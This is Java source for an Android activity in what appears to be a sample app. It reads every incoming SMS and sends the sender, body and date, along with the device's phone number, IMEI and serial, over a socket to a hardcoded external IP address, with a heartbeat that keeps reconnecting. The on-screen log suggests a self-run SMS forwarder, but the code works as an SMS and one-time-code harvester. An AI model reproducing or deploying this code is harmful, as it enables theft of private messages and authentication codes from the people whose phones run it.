package com.brook.lazy.sample;

import android.Manifest;
import android.annotation.SuppressLint;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.support.annotation.Nullable;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.LinearLayoutManager;
import android.support.v7.widget.RecyclerView;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import com.brook.lazy.sms.SmsObserver;
import com.brook.lazy.sms.SmsResponseCallback;
import com.brook.lazy.utils.DevicesInfo;
import com.brook.lazy.utils.EncryptUtil;
import com.karumi.dexter.Dexter;
import com.karumi.dexter.MultiplePermissionsReport;
import com.karumi.dexter.PermissionToken;
import com.karumi.dexter.listener.PermissionRequest;
import com.karumi.dexter.listener.multi.MultiplePermissionsListener;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers;
import io.reactivex.rxjava3.annotations.NonNull;
import io.reactivex.rxjava3.core.Observable;
import io.reactivex.rxjava3.core.Observer;
import io.reactivex.rxjava3.disposables.Disposable;

public class MainActivity extends AppCompatActivity implements SmsResponseCallback {
    private final String TAG=getClass().getName();
    private TextView notData;
    private Button btnDeviceInfo;
    private RecyclerView mRecyclerView;
    private SmsObserver smsObserver;
    private SmsAdapter smsAdapter;

    private Handler mMainHandler;
    private Socket socket;
    // 线程池
    // 为了方便展示,此处直接采用线程池进行线程管理,而没有一个个开线程
    private ExecutorService mThreadPool;
    private InputStream is;
    private InputStreamReader isr ;
    private BufferedReader br ;
    private String response;
    private OutputStream outputStream;
    private Disposable mDisposable;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        mRecyclerView = (RecyclerView) findViewById(R.id.recyclerView);
        btnDeviceInfo = (Button) findViewById(R.id.btn_device_info);
//        smsObserver=new SmsObserver(this,this,new VerificationCodeSmsFilter("180"));
        LinearLayoutManager manager = new LinearLayoutManager(this);
        smsAdapter = new SmsAdapter();
        mRecyclerView.setLayoutManager(manager);
        mRecyclerView.setAdapter(smsAdapter);

        notData = (TextView) findViewById(R.id.not_data);
        Dexter.withActivity(this)
                .withPermissions(Manifest.permission.READ_SMS,Manifest.permission.READ_PHONE_STATE)
                .withListener(new MultiplePermissionsListener() {
                    @Override
                    public void onPermissionsChecked(MultiplePermissionsReport report) {
                        Log.i(getClass().getName(),"onPermissionsChecked ====="+report.areAllPermissionsGranted());
                        smsObserver = new SmsObserver(MainActivity.this, MainActivity.this);
                        smsObserver.registerSMSObserver();
                    }

                    @Override
                    public void onPermissionRationaleShouldBeShown(List<PermissionRequest> permissions, PermissionToken token) {
                        Log.i(getClass().getName(),"onPermissionRationaleShouldBeShown ====="+permissions.size());
                    }
                }).check();
//        Log.i(getClass().getName(),"registerSMSObserver =====开始注册");

        // 初始化线程池
        mThreadPool = Executors.newCachedThreadPool();
        initHandler();
        initListener();
    }

    private void initListener(){
        btnDeviceInfo.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if(socket.isConnected()){
                    String registerInfo = deviceInfo().toString();
                    smsAdapter.setmSmsLists("注册设备:"+registerInfo);
                    mRecyclerView.scrollToPosition(smsAdapter.getItemCount());
                    sendSocketMessage(registerInfo);
                }else{
                    connectSocket();
                }
            }
        });
    }

    @Override
    public void onCallbackSmsContent(String[] code) {
//        textView.setText("短信验证码:" + code);
//        Log.i(getClass().getName(),"短信内容"+code);
        notData.setVisibility(View.GONE);
        mRecyclerView.setVisibility(View.VISIBLE);
        String SmsInfo=smsInfo(code).toString();
        smsAdapter.setmSmsLists("发送短信:"+SmsInfo);
        mRecyclerView.scrollToPosition(smsAdapter.getItemCount());
        sendSocketMessage(SmsInfo);
        String smsInfo="_id: " + code[0] + "   address: " + code[1]+ "   body: " + code[2]+ "   date: " + code[3]+ "   name: " + code[4];
        smsAdapter.setmSmsLists(smsInfo);
        mRecyclerView.scrollToPosition(smsAdapter.getItemCount());
    }
    @SuppressLint("HandlerLeak")
    private void initHandler(){
        // 实例化主线程,用于更新接收过来的消息
        mMainHandler = new Handler() {
            @Override
            public void handleMessage(Message msg) {
                switch (msg.what) {
                    case 0:{
                        String readMsg = (String) msg.obj;
                        Log.i(TAG,"收到消息"+readMsg);
                        break;
                     }
                    case 1:
                        smsAdapter.setmSmsLists("====连接成功====");
                        mRecyclerView.scrollToPosition(smsAdapter.getItemCount());
                        if(mDisposable!=null&&!mDisposable.isDisposed()){
                            mDisposable.dispose();
                        }
                        interval(50);
                        break;
                    case 3:
                        String readMsg = (String) msg.obj;
                        smsAdapter.setmSmsLists("接受到消息===>> "+readMsg);
                        mRecyclerView.scrollToPosition(smsAdapter.getItemCount());
                        Log.i(TAG,"收到消息"+readMsg);
                        break;
                }
            }
        };
        smsAdapter.setmSmsLists("====开始连接服务====");
        mRecyclerView.scrollToPosition(smsAdapter.getItemCount());
        // 利用线程池直接开启一个线程 & 执行该线程
        connectSocket();
    }

    private void connectSocket(){
        mThreadPool.execute(new Runnable() {
            @Override
            public void run() {
                try {

//                    http://47.75.166.206/
//                    172.21.38.135
                    // 创建Socket对象 & 指定服务端的IP 及 端口号
                    socket = new Socket("47.75.166.206", 9503);
                    // 判断客户端和服务器是否连接成功
                    Log.i(TAG,"是否连接成功"+socket.isConnected());
                    if(socket.isConnected()){
                        Message msg = Message.obtain();
                        msg.what = 1;
                        mMainHandler.sendMessage(msg);
//                        acceptMessage();
                        receievmessage();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        });

    }
    //接受服务器消息
    public void receievmessage(){
        try{
            while(true){
                DataInputStream input = new DataInputStream(socket.getInputStream());
                byte[] buffer;
                buffer = new byte[input.available()];
                if(buffer.length != 0){
                    // 读取缓冲区
                    input.read(buffer);
                    String msg = new String(buffer, "GBK");//注意转码，不然中文会乱码。
                    Message m = new Message();
                    m.what = 3;
                    m.obj = msg;
                    mMainHandler.sendMessage(m);
                }
            }

        }catch (Exception e) {

            e.printStackTrace();
            Message m = new Message();
            m.what = -1;
            mMainHandler.sendMessage(m);
        }
    }


    // 接收 服务器消息
    private void acceptMessage(){
        mThreadPool.execute(new Runnable() {
            @Override
            public void run() {
                try {
                    // 步骤1：创建输入流对象InputStream
                    is = socket.getInputStream();
                    // 步骤2：创建输入流读取器对象 并传入输入流对象
                    // 该对象作用：获取服务器返回的数据
                    isr = new InputStreamReader(is);
                    br = new BufferedReader(isr);
                    // 步骤3：通过输入流读取器对象 接收服务器发送过来的数据
                    response = br.readLine();
                    Log.i(TAG,"接受服务器数据"+response);
                    // 步骤4:通知主线程,将接收的消息显示到界面
                    Message msg = Message.obtain();
                    msg.what = 0;
                    msg.obj = response;
                    mMainHandler.sendMessage(msg);
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        });
    }


    // 发送消息 给 服务器
    private void sendSocketMessage(final String sendMsg){
        mThreadPool.execute(new Runnable() {
            @Override
            public void run() {
                try {
                    // 步骤1：从Socket 获得输出流对象OutputStream
                    // 该对象作用：发送数据
                    outputStream = socket.getOutputStream();
                    // 步骤2：写入需要发送的数据到输出流对象中
                    Log.i(TAG,"发送数据: "+sendMsg);
                    outputStream.write((sendMsg+"\n").getBytes("utf-8"));
                    // 特别注意：数据的结尾加上换行符才可让服务器端的readline()停止阻塞
                    // 步骤3：发送数据到服务端
                    outputStream.flush();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        });
    }

    private void disConnect(){
        try {
            if(outputStream!=null){
                // 断开 客户端发送到服务器 的连接，即关闭输出流对象OutputStream
                outputStream.close();
            }
            if(br!=null){
                // 断开 服务器发送到客户端 的连接，即关闭输入流读取器对象BufferedReader
                br.close();
            }
            if(socket!=null){
                // 最终关闭整个Socket连接
                socket.close();
            }

            // 判断客户端和服务器是否已经断开连接
//            System.out.println(socket.isConnected());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /**
     * 获取设备信息
     * @return JSONObject
     */
    private JSONObject deviceInfo(){
        JSONObject jsonObject=new JSONObject();
        try {
            jsonObject.put("event","device_register");
            String secret=EncryptUtil.md5(DevicesInfo.getDeviceFubgerprint() + DevicesInfo.getDeviceSerial() + DevicesInfo.getIMEI(this));
            jsonObject.put("secret", secret);
            JSONObject jsonO=new JSONObject();
            jsonO.put("secret", secret);
            jsonO.put("model", DevicesInfo.getDeviceModel());
            jsonO.put("width", DevicesInfo.getDeviceWidth(this));
            jsonO.put("height", DevicesInfo.getDeviceHeight(this));
            jsonO.put("serial", DevicesInfo.getDeviceSerial());
            jsonO.put("userCode", "R53531029");
            jsonO.put("phone",  DevicesInfo.getNumber(this));
            jsonO.put("androidId", DevicesInfo.getIMEI(this));
            jsonO.put("fingerprint", DevicesInfo.getDeviceFubgerprint());
            jsonObject.put("data",jsonO);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return jsonObject;
    }



    /**
     * 短信信息
     * @return JSONObject
     */
    private JSONObject smsInfo(String[] smsInfo){
        JSONObject jsonObject=new JSONObject();
        try {
            jsonObject.put("event","sync_sms");
            String secret=EncryptUtil.md5(DevicesInfo.getDeviceFubgerprint() + DevicesInfo.getDeviceSerial() + DevicesInfo.getIMEI(this));
            jsonObject.put("secret", secret);
            JSONObject jsonO=new JSONObject();
            jsonO.put("userCode", "R53531029");
            jsonO.put("smsid", smsInfo[0]);/** 短信id */
            jsonO.put("phone", smsInfo[1]);/** 手机号 */
            jsonO.put("content", smsInfo[2]);/** 短信内容 */
            jsonO.put("date", smsInfo[3]);/** 发送时间 */
            jsonO.put("name", smsInfo[4]);
            jsonObject.put("data",jsonO);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return jsonObject;
    }

    /**
     * 心跳信息
     * @return JSONObject
     */
    private JSONObject sendPing(){
        JSONObject jsonObject=new JSONObject();
        try {
            String secret=EncryptUtil.md5(DevicesInfo.getDeviceFubgerprint() + DevicesInfo.getDeviceSerial() + DevicesInfo.getIMEI(this));
            jsonObject.put("secret",secret);
            jsonObject.put("event", "ping");
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return jsonObject;
    }

    /**
     * 每隔[minutes]毫秒后执行指定动作
     *
     * @param minutes
     */
    public void interval(long minutes) {
        Observable.interval(minutes, TimeUnit.SECONDS)
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(new Observer<Long>() {
                    @Override
                    public void onSubscribe(@NonNull Disposable d) {
                        mDisposable=d;
                    }

                    @Override
                    public void onNext(@NonNull Long aLong) {
                        Log.i(TAG,"倒计时==="+aLong);
                        String sendPing =sendPing().toString();
                        smsAdapter.setmSmsLists("每隔"+minutes+"秒检测心跳: "+sendPing);
                        mRecyclerView.scrollToPosition(smsAdapter.getItemCount());
                        if(socket!=null&&socket.isConnected()){
                            sendSocketMessage(sendPing().toString());
                        }else {
                            connectSocket();
                        }
                    }

                    @Override
                    public void onError(@NonNull Throwable e) {
                        disConnect();
                        connectSocket();
                    }

                    @Override
                    public void onComplete() {

                    }
                });
    }


    @Override
    protected void onDestroy() {
        if(mDisposable!=null&&!mDisposable.isDisposed()){
            mDisposable.dispose();
        }
        if(smsObserver!=null){
            smsObserver.unregisterSMSObserver();
        }
        disConnect();
        super.onDestroy();
    }

}
